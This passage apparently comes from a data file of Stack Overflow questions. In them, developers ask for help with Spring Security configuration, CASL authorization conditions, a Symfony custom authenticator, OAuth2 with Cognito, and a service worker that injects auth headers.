        &lt;list&gt;
            &lt;value&gt;MODE_INHERITABLETHREADLOCAL&lt;/value&gt;
        &lt;/list&gt;
    &lt;/property&gt;
&lt;/bean&gt;
</code></pre>
<p>This actually used to be just a private subclass, but I changed it to a Component to make sure it is managed by Spring.</p>
<pre><code>/**
 * Update tenant data for Thread.
 */
@Component
@Scope(&quot;prototype&quot;)
public class UpdateTenantThread implements Runnable {
    private static final Logger LOG = LoggerFactory.getLogger(UpdateTenantThread.class);

    Long tenantId;
    Properties settings;

    @Autowired
    private TenantUpdateHandler tenantUpdateHandler;

    UpdateTenantCopy() {}

    public void init(Long tenantId,
        Properties settings) {
        this.tenantId = tenantId;
        this.settings = (Properties) settings.clone();
    }

    @Override
    public void run() {
        try {
            tenantUpdateHandler.update(tenantId, settings);
        } catch (TenantServiceException ex) {
            LOG.error(&quot;Problem updating copy of settings&quot;, ex);
        }
    }
}
</code></pre>
"
"<p>I have the following CASL ability factory:</p>
<pre class=""lang-js prettyprint-override""><code>type Subjects =
  | InferSubjects&lt;
      | typeof Post
      | typeof User
    &gt;
  | 'all';

export type AppAbility = PureAbility&lt;[Action, Subjects]&gt;;

@Injectable()
export class CaslAbilityFactory {
  createForUser(user: Partial&lt;User&gt;) {
    const { can, build } = new AbilityBuilder&lt;PureAbility&lt;[Action, Subjects]&gt;&gt;(
      PureAbility as AbilityClass&lt;AppAbility&gt;,
    );

    if (!user.emailVerified) {
      // Basic permissions for unverified users
      can(Action.Read, 'all');
      can([Action.Update, Action.Delete], User, { id: user.id });
    } else {
      // Verified user permissions
      can([Action.Create], Post);
      can([Action.Update, Action.Delete], Post, { authorId: user.id });
    }

    if (user.role === UserRole.MODERATOR) {
      // Additional permissions for moderators on top of verified user permissions
      can([Action.Update], Post);
    }

    if (user.role === UserRole.ADMIN) {
      // Admins can do anything, overriding all previous permissions
      can(Action.Manage, 'all');
    }

    return build({
      detectSubjectType: (item) =&gt;
        item.constructor as ExtractSubjectType&lt;Subjects&gt;,
      });
  }
}
</code></pre>
<p>However, while using only basic conditions <code>{ authorId: user.id }</code> (which I thought didn't need a custom conditionMatcher), it throws</p>
<pre class=""lang-bash prettyprint-override""><code>You need to pass &quot;conditionsMatcher&quot; option in order to restrict access by conditions
</code></pre>
<p>I partially fixed by passing <code>conditionsMatcher: buildMongoQueryMatcher({})</code> into the <code>build()</code> function argument object as a property. Although the error is gone, now the condition is not being checked i.e. user can edit other users' posts.</p>
<p>Why could it happen?</p>
<hr />
<p>I found a related thread (with no answers): <a href=""https://stackoverflow.com/questions/75262259/nest-js-casl-conditional-checking-is-not-working"">Nest.js + Casl conditional checking is not working</a></p>
<p>In the comments, it's mentioned that the OP ended up using nest-casl instead. I hope there's a way without switching to another package.</p>
<hr />
<p><strong>UPDATE:</strong> According to the comment, I tried to change <code>PureAbility</code> to <code>Ability</code> but seems like <code>Ability</code> does not exist in the latest CASL version. Below is my try to use <code>createMongoAbility</code>, but the result is still the same.</p>
<pre class=""lang-js prettyprint-override""><code>const conditionsMatcher = buildMongoQueryMatcher({ $ne, $nor, $eq }, { ne, nor, eq })

@Injectable()
export class CaslAbilityFactory {
  createForUser(user: Partial&lt;User&gt;) {
    const { can, cannot, build } = new AbilityBuilder&lt;PureAbility&lt;[Action, Subjects]&gt;&gt;(
      // PureAbility as AbilityClass&lt;AppAbility&gt;,
      createMongoAbility
    );
    console.log({ userId: user.id })
    if (user.role === UserRole.USER &amp;&amp; !user.emailVerified) {
      // Basic permissions for unverified users
      can(Action.Read, 'all');
      can([Action.Update, Action.Delete], User, { id: user.id });
    } else if (user.role === UserRole.USER) {
      // Verified user permissions
      can([Action.Create], Post);
      can([Action.Update, Action.Delete], Post, { authorId: { $eq: user.id } });
    }

    if (user.role === UserRole.MODERATOR) {
      // Additional permissions for moderators on top of verified user permissions
      can([Action.Update], Post);
      can([Action.Create], ActionVote);
}

    if (user.role === UserRole.ADMIN) {
      // Admins can do anything, overriding all previous permissions
      can(Action.Manage, 'all');
    }

    return build({
      // Read https://casl.js.org/v6/en/guide/subject-type-detection#use-classes-as-subject-types for details
      detectSubjectType: (item) =&gt;
        item.constructor as ExtractSubjectType&lt;Subjects&gt;,
        conditionsMatcher
      });
  }
}
</code></pre>
"
"<p>I have a Symfony 7 project where I'm implementing custom authentication logic for the login route (/api/login). I have a login method in my controller that handles user login and generates a token based on the provided name. Additionally, I've created a custom AuthenticationListener class that implements AuthenticatorInterface to handle authentication for other routes.</p>
<p>Here's a summary of the relevant code:</p>
<pre><code>&lt;?php

namespace App\EventListener;

use Symfony\Component\EventDispatcher\Attribute\AsEventListener;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;



class AuthenticationListener implements AuthenticatorInterface
{

    public function supports(Request $request): ?bool
    {
        $route = $request-&gt;attributes-&gt;get('_route');
        return str_starts_with($route, 'api_');
    }

    #[AsEventListener(event: 'kernel.request')]
    public function authenticate(RequestEvent|Request $event): Passport
    {
        $request = $event-&gt;getRequest();

        // Check if the request is for the login route
        if ($request-&gt;attributes-&gt;get('_route') === 'login') {

            return new Passport();
        }


        if (!$request-&gt;headers-&gt;has('Authorization')) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $key = $request-&gt;headers-&gt;get('Authorization');

        if (!$key) {
            throw new UnauthorizedHttpException('Unauthorized', 'Authorization header is missing');
        }

        $decryptedName = $this-&gt;decrypt($key);

        if (!$decryptedName) {
            throw new UnauthorizedHttpException('Unauthorized', 'Invalid or expired token');
        }

        // Create a UserBadge for other routes
        $userBadge = new UserBadge($decryptedName, function ($username) {
            return null;
        });

        return new Passport($userBadge);
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }


    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}

</code></pre>
<pre><code>class UserController extends AbstractController
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }


    #[Route('/api/login', name: 'login', methods: ['POST'])]
    public function login(Request $request): JsonResponse
    {
        // Retrieve the request data
        $requestData = json_decode($request-&gt;getContent(), true);

        // Ensure the required fields are provided
        if (!isset($requestData['name'])) {
            return new JsonResponse(['error' =&gt; 'Name field is required'], Response::HTTP_BAD_REQUEST);
        }

        $name = $requestData['name'];

        // Encrypt the name
        $encryptedName = $this-&gt;encrypt($name);

        // Generate a token based on the encrypted name
        $token = $this-&gt;generateToken($encryptedName);

        // Return the token to the client
        return new JsonResponse(['token' =&gt; $token]);
    }

    private function encrypt(string $name): string
    {
        $secretKey = $_ENV['APP_SECRET'];
        $key = openssl_digest($secretKey, 'SHA256', TRUE);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertextRaw = openssl_encrypt($name, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertextRaw, $key, true);
        $output = base64_encode($iv . $hmac . $ciphertextRaw);

        return $output;
    }

    private function generateToken(string $encryptedName): string
    {
        // Generate a token based on the encrypted name
        return hash('sha256', $encryptedName);
    }
</code></pre>
<p>Despite my efforts, I'm encountering challenges bypassing authentication for the login route and ensuring proper authentication for other routes. I've experimented with different configurations, but I keep receiving errors related to missing or invalid authorization headers.</p>
<p>Could someone provide guidance on how to correctly implement custom authentication logic for the login route while ensuring authentication for other routes remains intact? Any insights, code examples, or configuration suggestions would be greatly appreciated. Thank you!</p>
<pre><code>security:
password_hashers:
    Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
firewalls:
    dev:
        pattern: ^/(_(profiler|wdt)|css|images|js)/
        security: false
    main:
        lazy: true
        stateless: true
        custom_authenticators:
            - App\EventListener\AuthenticationListener
    api_login:
        pattern: ^/api/login
        stateless: true

access_control:
    - { path: '^/api/login', roles: PUBLIC_ACCESS }
    - { path: '^/', roles: IS_AUTHENTICATED_FULLY }
</code></pre>
<p><strong>update</strong>
I have updated the security.yml and customauthenticator.php but I receive this error &quot;   &quot;title&quot;: &quot;An error occurred&quot;,
&quot;status&quot;: 401,
&quot;detail&quot;: &quot;Full authentication is required to access this resource.&quot;,
&quot;class&quot;: &quot;Symfony\Component\HttpKernel\Exception\HttpException&quot;,:</p>
<pre><code>security:
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false
        main:
            lazy: true
            stateless: true
            custom_authenticators:
                - App\Security\CustomAuthenticator
        api_login:
            pattern: ^/api/login
            stateless: false # Change stateless to false for stateful authentication

    access_control:
        - { path: '^/api/login', roles: PUBLIC_ACCESS }
        - { path: '^/', roles: [ROLE_USER, ROLE_COMPANY_ADMIN, ROLE_SUPER_ADMIN] }
</code></pre>
<pre><code>&lt;?php

namespace App\Security;

use Doctrine\ORM\EntityManagerInterface;
use Exception;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\User\UserInterface;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

use App\Entity\User; // Assuming your User entity is in the App\Entity namespace

class CustomAuthenticator implements AuthenticatorInterface
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }

    public function supports(Request $request): ?bool
    {
        return $request-&gt;isMethod(Request::METHOD_POST)
            &amp;&amp; $request-&gt;getRequestUri() === '/api/login';
    }

    public function authenticate(Request $request): Passport
    {
        $requestData = json_decode($request-&gt;getContent(), true);
        if (!isset($requestData['name'])) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Required field &quot;name&quot; is missing');
        }

        $name = $requestData['name'];

        try {
            $decryptedName = $this-&gt;decrypt($name);
        } catch (Exception $e) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Invalid or tampered token');
        }

        $user = $this-&gt;loadUser($decryptedName);

        $userBadge = new UserBadge($decryptedName, function ($name) {
            return $this-&gt;loadUser($name);
        });

        return new Passport($userBadge);
    }

    private function loadUser(string $name): ?UserInterface
    {
        return $this-&gt;entityManager-&gt;getRepository(User::class)-&gt;findOneBy(['name' =&gt; $name]);
    }

    private function decrypt($string): string
    {
        // Decrypt the authorization token using your decryption method
        $secret_key = $_ENV['APP_SECRET']; // Ensure you have APP_KEY set in your environment variables
        $key = openssl_digest($secret_key, 'SHA256', TRUE);
        $c = base64_decode($string);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($c, 0, $ivlen);
        $hmac = substr($c, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($c, $ivlen + $sha2len);
        $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        //        dd($original_plaintext);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, true);
        if (hash_equals($hmac, $calcmac)) {
            return $original_plaintext;
        }
        return ''; // Return an empty string if decryption fails
    }


    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }

    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}
</code></pre>
"
"<p>I have a service worker which intercepts fetch events, and tries to add Authorization token to external API calls. The worker is installed, activated for the following scope: http://localhost:3505/ which is the root of my (development) application. It calls an external API http://localhost:5098/graphql which is serves as my backend. These calls are initiated on client (browser) side.</p>
<p>For me it seems that the fetch event won't intercept these graphql calls, my first think is because it is outside of the scope.</p>
<pre><code>const installEvent = () =&gt; {
    self.addEventListener('install', (event) =&gt; {
        event.waitUntil(self.skipWaiting());
        console.log('&gt;&gt; [SW]: service worker installed');
    });
};
installEvent();

const activateEvent = () =&gt; {
    self.addEventListener('activate', (event) =&gt; {
        event.waitUntil(self.clients.claim()); // Become available to all pages
        console.log('&gt;&gt; [SW]: service worker activated');
    });
};
activateEvent();

const HTTP_ENDPOINT =&quot;http://localhost:5098/graphql&quot;;
const token = &quot;&lt;my-bearer-token-comes-here&gt;&quot;;

const fetchEvent = () =&gt; {
    self.addEventListener('fetch', (e) =&gt; {
        if (token &amp;&amp; e.request.url == HTTP_ENDPOINT) {
            e.request.headers[&quot;Authorization&quot;] = &quot;Bearer &quot;+token;
        }
    });
};

fetchEvent();
</code></pre>
<p>Is it possible to intercept and modify fetch calls to the graphql endpoint? I think it is not - but a question is worth asking.</p>
"
"<p>I have been trying to learn Role Based Access Control of Spring Security. I have a question I can't find satisfactory answers to.</p>
<p>We can simply add roles to user using the default User implementation of UserDetails interface. Also we can restrict access to API endpoints using:</p>
<ol>
<li>@Secured to secure access by discretely named roles.</li>
<li>@PreAuthorize which can also take Spring Expression Language(SpEL).</li>
</ol>
<p>I can't find examples to reason what benefit do we get for configuring everything manually to do something which is already inbuilt.</p>
<p>PS: Please feel free to ask clarifying questions if there is something vague in my question.</p>
"
"<p>I upgraded from 2.7.2 Springboot version to 3.2.1.
I refactored the spring security section,it was:</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableGlobalMethodSecurity(securedEnabled = true)
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {


    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .csrf().disable()
                .sessionManagement().sessionCreationPolicy(STATELESS)
                .and()
                .headers().cacheControl();
    }


    @Bean
    public FilterRegistrationBean filterRegistrationBean(){
        FilterRegistrationBean registrationBean = new FilterRegistrationBean();
        registrationBean.setFilter(jwtAuthenticationFilter());
        registrationBean.addUrlPatterns(getTokenBasedAuthEntryPoint());
        return registrationBean;
    }

    @Bean
    public JwtAuthenticationFilter jwtAuthenticationFilter() {
        return new JwtAuthenticationFilter();
    }

}
</code></pre>
<p>and now it is:</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableGlobalMethodSecurity(securedEnabled = true)
public class SecurityConfiguration {


    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .sessionManagement(sessionManagement -&gt;
                        sessionManagement
                                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                )
                .csrf(AbstractHttpConfigurer::disable)
                .headers(headers -&gt; headers
                        .cacheControl(HeadersConfigurer.CacheControlConfig::disable)
                );

        return http.build();
    }


    @Bean
    public FilterRegistrationBean&lt;JwtAuthenticationFilter&gt; filterRegistrationBean(){
        FilterRegistrationBean&lt;JwtAuthenticationFilter&gt; registrationBean = new FilterRegistrationBean&lt;&gt;();
        registrationBean.setFilter(jwtAuthenticationFilter());
        registrationBean.addUrlPatterns(getTokenBasedAuthEntryPoint());
        return registrationBean;
    }

    @Bean
    public JwtAuthenticationFilter jwtAuthenticationFilter() {
        return new JwtAuthenticationFilter();
    }

}
</code></pre>
<p>The problem is with my Post method from my controller that it looks like this</p>
<pre><code>@RestController
@RequestMapping(&quot;init&quot;)
@CrossOrigin
public class InitRestController {

  public static final String UNAUTHORIZED = &quot;unauthorized {}&quot;;
  @Autowired
  AuthorizationServiceImpl authorizationService;

  @Autowired
  RestControllerUtils restControllerUtils;

  @Autowired
  CancelInitService cancelInitService;

  @Autowired
  AQListener listener;

  private static final Logger log = LoggerFactory.getLogger(InitRestController.class);

@PostMapping(&quot;messageSimulator&quot;)
  public void messageSimulator(@RequestHeader(value = &quot;authorization&quot;) final String jwt,
                              @RequestBody CompoundMessageDTO message) throws Exception {
    try {
      authorizationService.claimJwt(jwt);
      message.setFullMessageBody(JSONUtils.toJSon(message));
      listener.processMessage(message);
    }
    catch (JwtException | IllegalArgumentException e){
      log.error(UNAUTHORIZED,e.getMessage());
      throw new ResponseStatusException(HttpStatus.UNAUTHORIZED,e.getMessage());
    }
  }
</code></pre>
<p>In Postman if I send a POST request I will have this in Intellij console:  Mapped to ResourceHttpRequestHandler  and then an error: status 405 with Method POST not allowed.Is trying to serve me static resources instead of calling the method from the controller</p>
<p>I have a WebMvcConfig that looks like this:</p>
<pre><code>@Configuration
public class MvcConfiguration implements WebMvcConfigurer {
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler(&quot;/**&quot;)
                .addResourceLocations(&quot;classpath:/static/&quot;)
                .resourceChain(true)
                .addResolver(new PathResourceResolver() {
                    @Override
                    protected Resource getResource(String resourcePath, Resource location) throws IOException {
                        Resource requestedResource = location.createRelative(resourcePath);

                        return requestedResource.exists() &amp;&amp; requestedResource.isReadable() ? requestedResource
                                : new ClassPathResource(&quot;/static/index.html&quot;);
                    }
                });
        registry.setOrder(Ordered.LOWEST_PRECEDENCE);
    }
</code></pre>
<p>Why is this behaviour? It worked like this before upgrading to version 3.2.1 but now suddenly this doesn't work. I have multiple methods in that controller and for example GET method it works. Also I debugged a little bit the DispatcherServlet from libraries and I saw that the handler it's HandlerExecutionChain with ResourceHttpRequestHandler [classpath/static] and with 6 interceptors. I don't understand what can I do here to solve the problem, I tried multiple solutions.Thank you</p>
"
"<p>My question is as follows:
<br/>When integrating Spring WebFlux with Spring Security, and retrieving user IDs by parsing tokens from <br/>the ReactiveSecurityContextHolder.getContext() context, how does it ensure that each user's request <br/>corresponds to its own context and avoids mismatches, especially when multiple users are accessing the <br/>same endpoint simultaneously?</p>
<p><br/>the code show as bellow:</p>
<pre><code>@PostMapping(value = &quot;/upload&quot;, produces = &quot;application/json&quot;)
    public Flux&lt;Result&lt;String&gt;&gt; upload(@RequestPart(&quot;file&quot;) FilePart filePart) {
        return getUserId()
                .publishOn(Schedulers.boundedElastic())
                .flatMapMany(userId -&gt; filePart.content()
                        .buffer()
                        .flatMap(dataBuffers -&gt; {
                            int totalLength = dataBuffers.stream()
                                    .mapToInt(DataBuffer::readableByteCount)
                                    .sum();
                            byte[] bytes = new byte[totalLength];
                            int offset = 0;
                            for (DataBuffer dataBuffer : dataBuffers) {
                                int length = dataBuffer.readableByteCount();
                                dataBuffer.read(bytes, offset, length);
                                offset += length;
                                DataBufferUtils.release(dataBuffer);
                            }
                            log.info(&quot;userId {} received {} file &quot;, userId,filePart.filename());
                            SongCommand.AddSongResource addSongResource = new SongCommand.AddSongResource(userId, filePart.filename(), bytes);
                            CompletionStage&lt;EntityResponse&gt; response = songService.uploadResource(addSongResource);
                            return Mono.fromCompletionStage(response)
                                    .map(entityResponse -&gt; switch (entityResponse) {
                                         case EntityResponse.CommandProcessed _ -&gt;
                                          Result.success(&quot;upload successful&quot;);
                                         case EntityResponse.CommandRejectedWithEx commandRejectedWithEx -&gt;
                                          Result.fail(STR.&quot;upload failed commandRejectedWithEx.error().getMessage()}&quot;);
                                         case EntityResponse.CommandRejected commandRejected -&gt;
                                          Result.fail(commandRejected.error().name());
                                         default -&gt;  Result.fail(&quot;not support&quot;);
                                     });
                        }));
    }


  protected Mono&lt;String&gt; getUserId()  {
        return ReactiveSecurityContextHolder.getContext()
                .map(context -&gt; {
                    Authentication authentication = context.getAuthentication();
                    String principal = (String) authentication.getDetails();
                    return authenticationService.parseTokenForSubject(principal);
                });

    }
</code></pre>
<p><br/>As shown in the code above, when multiple users access the upload method simultaneously, there are two <br/>main parameters: one is obtained from <strong>ReactiveSecurityContextHolder.getContext()</strong> and the other is <br/>obtained from <strong>@RequestPart(&quot;file&quot;)</strong>. Since they both execute asynchronously, is there a possibility <br/>of mismatching user data? I am a newcomer who is practicing using reactive frameworks and does not <br/>understand their underlying logic.</p>
<p>thanks for your answer.</p>
"
"<p>We have a service that is written in spring boot and currently uses kerberos/spnego with keytab to authenticate.
I was trying to replace this with Oauth2 framework and since there is no UI for the API and it is mostly service Id to be authenticated, I am in a dilemma to how to proceed. I read somewhere that I can use JWT. Should I make use of JWT to get the access token? Can someone please show me a direction? Or there any sample examples that I can follow?</p>
<p>Thanks,</p>
<p>pbale</p>
"
"<p>I feel like the default behaviour of persisting a successful login has changed in Spring Security.</p>
<p>My security config:</p>
<pre><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity httpSecurity)
        throws Exception {
    httpSecurity
            .authorizeHttpRequests(authReg -&gt; authReg
                    .anyRequest().authenticated()
            )
            // without this I need to login at every request
            .sessionManagement(sess -&gt; sess
                    .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            )
            .httpBasic(
                    Customizer.withDefaults()
            )
            .csrf(AbstractHttpConfigurer::disable); // DEV ONLY
    return httpSecurity.build();
}
</code></pre>
<p>Why would I need to specify the session-creation-policy now to achieve the effect of not having to log in every time, thus using an established session.</p>
<p>Especially since the <a href=""https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html"" rel=""nofollow noreferrer"">docs</a> tell me &quot;This is done automatically by default, so no additional code is necessary&quot;.</p>
<p>Spring Boot 3.2.2, Spring Security 6.2.1</p>
"
"<p>I have a java web api which is configured with Spring Security with AWS Cognito OAuth2 provider. I have separate Web Application (ReactJs) which makes calls to the api, so the ui needs to login for the protected endpoints.</p>
<p>The web app which is hosted separately runs the below code when Login button is clicked:</p>
<p><code>window.location.assign(&quot;http://&lt;api-server:port&gt;/oauth2/authorization/cognito)</code></p>
<p>which initiates the flow by eventually redirecting to <code>https://&lt;provider-url&gt;/oauth2/authorize?response_type=code&amp;client_id=xxx&amp;scope=openid&amp;state=???&amp;redirect_uri=http://&lt;api-server:port&gt;/login/oauth2/code/cognito&amp;nonce=???</code>. This seems to work but, is this the right approach? Also how do I set state parameters (I need it to store the url of the web page which initiated the call so I can get the user back to the initiating page post login. This currently is hardcoded in SimpleUrlAuthenticationSuccessHandler.onAuthenticationSuccess)</p>
<p>Another approach seems to be to call the authorize end point directly <code>https://&lt;provider-url&gt;/oauth2/authorize?response_type=code&amp;client_id=xxx&amp;scope=openid&amp;state=???&amp;redirect_uri=http://&lt;api-server:port&gt;/login/oauth2/code/cognito&amp;nonce=???</code></p>
<p>In this case, is it safe to maintain client_id on the browser and if so, what should I provide for nonce and state. With the previous approach it automatically populates these values with state being some undecipherable value.</p>
"
"<p>I have created Security For Each UserDetails. And Added Login Page url for each as below.Now I want all the login page to be public and other endpoints that doesnot start with the user or business-segment to be public too.For more references <a href=""https://www.baeldung.com/spring-security-multiple-entry-points"" rel=""nofollow noreferrer"">I am following this documentation</a>.</p>
<pre><code>@Configuration
@Order(3)
@EnableWebSecurity
public class BusinessSegmentSecurity {
    @Bean
    public SecurityFilterChain securityFilterChainForBusinessSegment(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.cors(AbstractHttpConfigurer::disable);
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/business-segment/**&quot;));
        httpSecurity.authorizeHttpRequests(auth -&gt; auth
                .requestMatchers(&quot;/business-segment/auth/**&quot;).permitAll()
                .requestMatchers(&quot;/business-segment/**&quot;).authenticated());
        httpSecurity.formLogin(form -&gt; form
                .loginPage(&quot;/business-segment/auth/login&quot;)
                .loginProcessingUrl(&quot;/business-segment/auth/login&quot;)
                .permitAll()
                .defaultSuccessUrl(&quot;/business-segment&quot;))
                .logout(httpSecurityLogoutConfigurer -&gt; httpSecurityLogoutConfigurer.logoutSuccessUrl(&quot;/business-segment/auth/login&quot;));
        httpSecurity.userDetailsService(new BusinessSegmentService());
        return httpSecurity.build();
    }
}

@Configuration
@Order(1)
@EnableWebSecurity
public class AppSecurity {
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public SecurityFilterChain securityFilterChainForGuest(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/**&quot;));
        httpSecurity.authorizeHttpRequests(authorizationManagerRequestMatcherRegistry -&gt; authorizationManagerRequestMatcherRegistry.anyRequest().permitAll());
        return httpSecurity.build();
    }
}

@Configuration
@Order(2)
@EnableWebSecurity
public class UserSecurity {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.cors(AbstractHttpConfigurer::disable);
        httpSecurity.csrf(AbstractHttpConfigurer::disable);
        httpSecurity.securityMatcher(AntPathRequestMatcher.antMatcher(&quot;/user/**&quot;));
        httpSecurity.authorizeHttpRequests(auth -&gt; auth
                .requestMatchers(&quot;/user/auth/**&quot;).permitAll()
                .requestMatchers(&quot;/user/**&quot;).authenticated());
        httpSecurity.formLogin(form -&gt; form
                .loginPage(&quot;/user/auth/login&quot;)
                .loginProcessingUrl(&quot;/user/auth/login&quot;)
                .permitAll()
                .defaultSuccessUrl(&quot;/user&quot;))
                .logout(httpSecurityLogoutConfigurer -&gt; httpSecurityLogoutConfigurer.logoutSuccessUrl(&quot;/user/auth/login&quot;));
        httpSecurity.userDetailsService(new CustomUserDetailService());
        return httpSecurity.build();
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code></code></pre>
"
"<p>Why does the method onAuthenticationSuccess that implements</p>
<pre><code>
I use the onAuthenticationSuccess method of AuthenticationSuccessHandler to do some logical operations after successful login, such as adding JWTToken credentials, updating the user's database login time, etc., and the error java.lang.NullPointerException: null will be reported.

```java
@Override
    public void onAuthenticationSuccess(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Authentication authentication) throws IOException, ServletException {

        System.out.println(&quot;authenticationName:&quot; + authentication.getName());

        //Generate jwt and place it in the request header
        String jwt = jwtUtils.generateToken(authentication.getName());
        httpServletResponse.setHeader(jwtUtils.getHeader(),jwt);

        User accountDetails = (User) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        SysAccount sysAccount = sysAccountService.searchByEmployeeId(accountDetails.getUsername());//The username in User is EmployeeId, which is my custom user name.

        //Create a LambdaUpdateWrapper object
        LambdaUpdateWrapper&lt;SysAccount&gt; sysAccountUpdateWrapper = new UpdateWrapper&lt;SysAccount&gt;().lambda();
        //Set the update condition, match by employeeId
        sysAccountUpdateWrapper.eq(SysAccount::getEmployeeId, sysAccount.getEmployeeId());
        //Set the fields and values to be updated, only update the lastLoginTime, updateTime, updateUser three fields
        sysAccountUpdateWrapper.set(SysAccount::getLastLoginTime, sysAccount.getLastLoginTime());
        sysAccountUpdateWrapper.set(SysAccount::getUpdateTime, sysAccount.getUpdateTime());
        sysAccountUpdateWrapper.set(SysAccount::getUpdateUser, sysAccount.getUpdateUser());

        //Return json data
        JsonResult result = ResultTool.success();
        //Process the encoding method to prevent Chinese garbled characters
        httpServletResponse.setContentType(&quot;text/json;charset=utf-8&quot;);
        //Stuff into HttpServletResponse and return to the front desk
        httpServletResponse.getWriter().write(JSONUtil.toJsonStr(result));
    }
</code></pre>
<pre><code>If I remove some of the functions inside and only keep the following code, it will be fine. Then if I only remove the JWT or only the update database operation, an error will be reported. Anyway, it will be fine without either one.
</code></pre>
<pre class=""lang-java prettyprint-override""><code> @Override
    public void onAuthenticationSuccess(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Authentication authentication) throws IOException, ServletException {
        JsonResult result = ResultTool.success();
        httpServletResponse.setContentType(&quot;text/json;charset=utf-8&quot;);
        httpServletResponse.getWriter().write(JSONUtil.toJsonStr(result));

    }
</code></pre>
<p>Below is a screenshot of my error. Please forgive me for being perfunctory and add more words to ensure it can be published.
[1]: <a href=""https://i.stack.imgur.com/Q1pI6.png"" rel=""nofollow noreferrer"">https://i.stack.imgur.com/Q1pI6.png</a></p>
"
"<p>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {</p>
<pre><code>    return http.csrf().disable()
            .authorizeHttpRequests()
            .requestMatchers(&quot;/home/normal&quot;)
            .permitAll()
            .and()
            .authorizeHttpRequests().requestMatchers(&quot;/products/**&quot;)
            .authenticated().and().formLogin().and().build();


}
</code></pre>
